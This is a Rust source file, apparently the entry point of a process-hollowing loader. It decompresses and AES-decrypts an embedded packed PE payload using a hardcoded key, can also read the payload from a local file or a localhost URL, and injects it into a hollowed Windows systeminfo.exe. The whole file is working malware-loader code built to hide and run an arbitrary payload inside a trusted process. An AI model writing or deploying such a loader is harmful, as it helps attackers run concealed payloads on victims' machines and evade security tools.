mod hollow; 
use hollow::*;
use std::fs::File;
use std::io::{Read};
use log::{debug, error, info, warn};
use flate2::read::GzDecoder;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};

#[cfg(debug_assertions)]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
}

#[cfg(not(debug_assertions))]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Info).init();
}


fn main() {
    //env_logger::init();
    init_logging();
    info!("Start process hollowing");
    call_hollow_loader();
    std::thread::sleep(std::time::Duration::from_millis(10000));
}

fn call_hollow_loader(){
    let mut buf: Vec<u8> = Vec::new();
    //buf = retrieve_local_pe();
    // buf = retrieve_url_pe();
    let mut buf = retrieve_embedded_pe();
    let pe_to_exec = "C:\\Windows\\System32\\systeminfo.exe";
    debug!("PE to be hollowed : {}",pe_to_exec);
    hollow64(&mut buf, pe_to_exec);
}

fn retrieve_local_pe() -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::new();
    let file_to_load = "sample.exe";
    debug!("PE to be injected : {}", file_to_load); 

    let file = File::open(file_to_load);

    match file {
        Ok(mut f) => {
            if let Err(e) = f.read_to_end(&mut buf) {
                debug!("Error reading file: {}", e);
                return Vec::new(); // Return an empty vector in case of error
            }
            buf // return buffer
        }
        Err(_) => {
            debug!("Error opening file to load");
            Vec::new() // Return an empty vector in case of error
        }
    }
}
fn retrieve_url_pe() -> Vec<u8> {
    // URL of the binary file you want to read
    let url = "http://127.0.0.1/sample.exe";

    // Send a GET request
    let response = ureq::get(url).call();

    if let Ok(response) = response {
        if response.status().is_success(){
            // Get a reader from the response
            let mut reader = response.into_body().into_reader();

            // Create a buffer to store the bytes
            let mut buffer = Vec::new();

            // Read the bytes from the reader into the buffer
            if let Ok(_) = std::io::copy(&mut reader, &mut buffer) {
                debug!("File downloaded successfully. Size: {} bytes", buffer.len());
                buffer
            } else {
                debug!("Failed to read response bytes.");
                Vec::new()
            }
        } else {
            debug!("Failed to fetch the file. Status code: {}", response.status());
            Vec::new()
        }
    } else {
        debug!("Failed to make a request.");
        Vec::new()
    }
}

fn retrieve_embedded_pe() -> Vec<u8> {

    let mut embedded_payload: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.packed"));
    // 1. Decompress
    let mut decoder = GzDecoder::new(embedded_payload);
    let mut compressed_buffer = Vec::new();
    if let Err(_) = decoder.read_to_end(&mut compressed_buffer) {
        return Vec::new();
    }

    // 2. Decrypt
    let key = Key::<Aes256Gcm>::from_slice(b"616e2d65787472656d656c792d736563");
    let nonce = Nonce::from_slice(b"616e2d657874");
    let cipher = Aes256Gcm::new(key);

    match cipher.decrypt(nonce, compressed_buffer.as_ref()) {
        Ok(decrypted_bytes) => {
            info!("Payload decrypted and decompressed successfully.");
            decrypted_bytes
        }
        Err(e) => {
            error!("Decryption failed: {:?}", e);
            Vec::new()
        }
    }
}